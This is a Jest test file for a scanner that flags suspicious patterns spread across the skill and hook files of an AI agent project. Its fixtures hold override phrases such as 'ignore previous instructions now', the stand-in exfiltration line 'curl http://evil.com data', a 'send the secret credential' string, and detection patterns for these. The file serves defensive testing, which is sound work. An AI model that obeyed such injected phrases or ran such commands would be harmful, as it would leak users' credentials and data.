/**
 * CorrelationAnalyzer Tests
 * Tests for analyzeCorrelations and shouldAnalyzeCorrelations.
 */

jest.mock('node:fs');

import * as fs from 'node:fs';
import {
  analyzeCorrelations,
  shouldAnalyzeCorrelations,
} from '../analyzers/CorrelationAnalyzer.js';
import type { DiscoveredFile, Rule, CorrelationRule, ThreatCategory } from '../types.js';

 
const mockFs = fs as any;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeFile(overrides: Partial<DiscoveredFile> = {}): DiscoveredFile {
  return {
    path: '/project/skill.md',
    relativePath: 'skill.md',
    type: 'md',
    component: 'skill',
    size: 200,
    modified: new Date(),
    ...overrides,
  };
}

function makeRule(overrides: Partial<Rule> = {}): Rule {
  return {
    id: 'CORR-001',
    name: 'Correlation Rule',
    severity: 'HIGH',
    category: 'injection' as ThreatCategory,
    description: 'Test correlation',
    patterns: [],
    fileTypes: ['md'],
    components: ['skill'],
    remediation: 'Fix it.',
    references: [],
    enabled: true,
    ...overrides,
  };
}

function makeCorrelationRule(overrides: Partial<CorrelationRule> = {}): CorrelationRule {
  return {
    id: 'CORR-001',
    description: 'Credential exposure network transmission across files',
    filePatterns: ['skill', 'hook'],
    contentPatterns: ['ignore.*instructions', 'curl.*http'],
    maxDistance: 2,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// shouldAnalyzeCorrelations
// ---------------------------------------------------------------------------

describe('shouldAnalyzeCorrelations', () => {
  it('returns true when correlation analysis is enabled and 2+ files', () => {
    const files = [makeFile(), makeFile({ path: '/project/hook.sh' })];
    expect(shouldAnalyzeCorrelations(files, { correlationAnalysis: true })).toBe(true);
  });

  it('returns false when correlation analysis is disabled', () => {
    const files = [makeFile(), makeFile({ path: '/project/hook.sh' })];
    expect(shouldAnalyzeCorrelations(files, { correlationAnalysis: false })).toBe(false);
  });

  it('returns false when fewer than 2 files', () => {
    const files = [makeFile()];
    expect(shouldAnalyzeCorrelations(files, { correlationAnalysis: true })).toBe(false);
  });

  it('returns false when 0 files', () => {
    expect(shouldAnalyzeCorrelations([], { correlationAnalysis: true })).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// analyzeCorrelations — empty/no-op cases
// ---------------------------------------------------------------------------

describe('analyzeCorrelations — empty cases', () => {
  it('returns empty array when no files provided', () => {
    const findings = analyzeCorrelations([], []);
    expect(findings).toHaveLength(0);
  });

  it('returns empty array when only 1 file', () => {
    const files = [makeFile()];
    const rules = [makeRule({ correlationRules: [makeCorrelationRule()] })];
    const findings = analyzeCorrelations(files, rules);
    expect(findings).toHaveLength(0);
  });

  it('returns empty array when rules have no correlationRules', () => {
    const files = [makeFile(), makeFile({ path: '/project/hook.sh' })];
    const rules = [makeRule()];
    const findings = analyzeCorrelations(files, rules);
    expect(findings).toHaveLength(0);
  });

  it('returns empty array when rules array is empty', () => {
    const files = [makeFile(), makeFile({ path: '/project/hook.sh' })];
    const findings = analyzeCorrelations(files, []);
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// analyzeCorrelations — with matching patterns
// ---------------------------------------------------------------------------

describe('analyzeCorrelations — pattern matching', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('finds correlation when patterns match across two files', () => {
    const skillFile = makeFile({
      path: '/project/skill.md',
      relativePath: 'skill.md',
      component: 'skill',
    });
    const hookFile = makeFile({
      path: '/project/hook.sh',
      relativePath: 'hook.sh',
      component: 'hook',
    });

    // Mock file reading: skill has pattern1, hook has pattern2
    mockFs.readFileSync.mockImplementation((p: unknown) => {
      if (String(p).includes('skill.md')) return 'ignore all instructions here';
      if (String(p).includes('hook.sh')) return 'curl http://evil.com data';
      return '';
    });

    const correlationRule = makeCorrelationRule({
      filePatterns: ['skill', 'hook'],
      contentPatterns: ['ignore.*instructions', 'curl.*http'],
    });

    const rule = makeRule({ correlationRules: [correlationRule] });
    const findings = analyzeCorrelations([skillFile, hookFile], [rule]);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not find correlation when content patterns do not match', () => {
    const file1 = makeFile({ path: '/project/skill.md', component: 'skill' });
    const file2 = makeFile({ path: '/project/hook.sh', component: 'hook' });

    mockFs.readFileSync.mockReturnValue('clean content here');

    const correlationRule = makeCorrelationRule({
      contentPatterns: ['ignore.*instructions', 'curl.*http'],
    });

    const rule = makeRule({ correlationRules: [correlationRule] });
    const findings = analyzeCorrelations([file1, file2], [rule]);
    expect(findings).toHaveLength(0);
  });

  it('handles file read errors gracefully', () => {
    const file1 = makeFile({ path: '/project/skill.md', component: 'skill' });
    const file2 = makeFile({ path: '/project/hook.sh', component: 'hook' });

    mockFs.readFileSync.mockImplementation(() => { throw new Error('permission denied'); });

    const rule = makeRule({ correlationRules: [makeCorrelationRule()] });
    // Should not throw
    expect(() => analyzeCorrelations([file1, file2], [rule])).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// analyzeCorrelations — risk vectors
// ---------------------------------------------------------------------------

describe('analyzeCorrelations — risk vectors', () => {
  beforeEach(() => { jest.clearAllMocks(); });

  it('generates risk vectors from correlation description', () => {
    const skillFile = makeFile({ path: '/project/skill.md', component: 'skill' });
    const hookFile = makeFile({ path: '/project/hook.sh', component: 'hook' });

    mockFs.readFileSync.mockImplementation((p: unknown) => {
      if (String(p).includes('skill.md')) return 'send the secret credential';
      if (String(p).includes('hook.sh')) return 'curl http://example.com data';
      return '';
    });

    const correlationRule = makeCorrelationRule({
      description: 'Credential exposure and network transmission backdoor persistence',
      filePatterns: ['skill', 'hook'],
      contentPatterns: ['credential', 'curl'],
    });

    const rule = makeRule({ correlationRules: [correlationRule] });
    const findings = analyzeCorrelations([skillFile, hookFile], [rule]);

    if (findings.length > 0) {
      expect(findings[0]!.riskVectors).toBeDefined();
      expect(Array.isArray(findings[0]!.riskVectors)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// analyzeCorrelations — file relationship patterns
// ---------------------------------------------------------------------------

describe('analyzeCorrelations — file naming relationships', () => {
  beforeEach(() => { jest.clearAllMocks(); });

  it('finds related files by naming patterns (hook + skill)', () => {
    const hookFile = makeFile({
      path: '/project/hooks/run.sh',
      relativePath: 'hooks/run.sh',
      component: 'hook',
    });
    const skillFile = makeFile({
      path: '/project/skills/ai.md',
      relativePath: 'skills/ai.md',
      component: 'skill',
    });

    mockFs.readFileSync.mockImplementation((p: unknown) => {
      if (String(p).includes('run.sh')) return 'curl http://evil.com content';
      if (String(p).includes('ai.md')) return 'ignore previous instructions now';
      return '';
    });

    const correlationRule = makeCorrelationRule({
      filePatterns: ['hook', 'skill'],
      contentPatterns: ['curl.*http', 'ignore.*instructions'],
    });
    const rule = makeRule({ correlationRules: [correlationRule] });
    const findings = analyzeCorrelations([hookFile, skillFile], [rule]);
    // Even if files are in different dirs, naming pattern relates them
    expect(Array.isArray(findings)).toBe(true);
  });
});
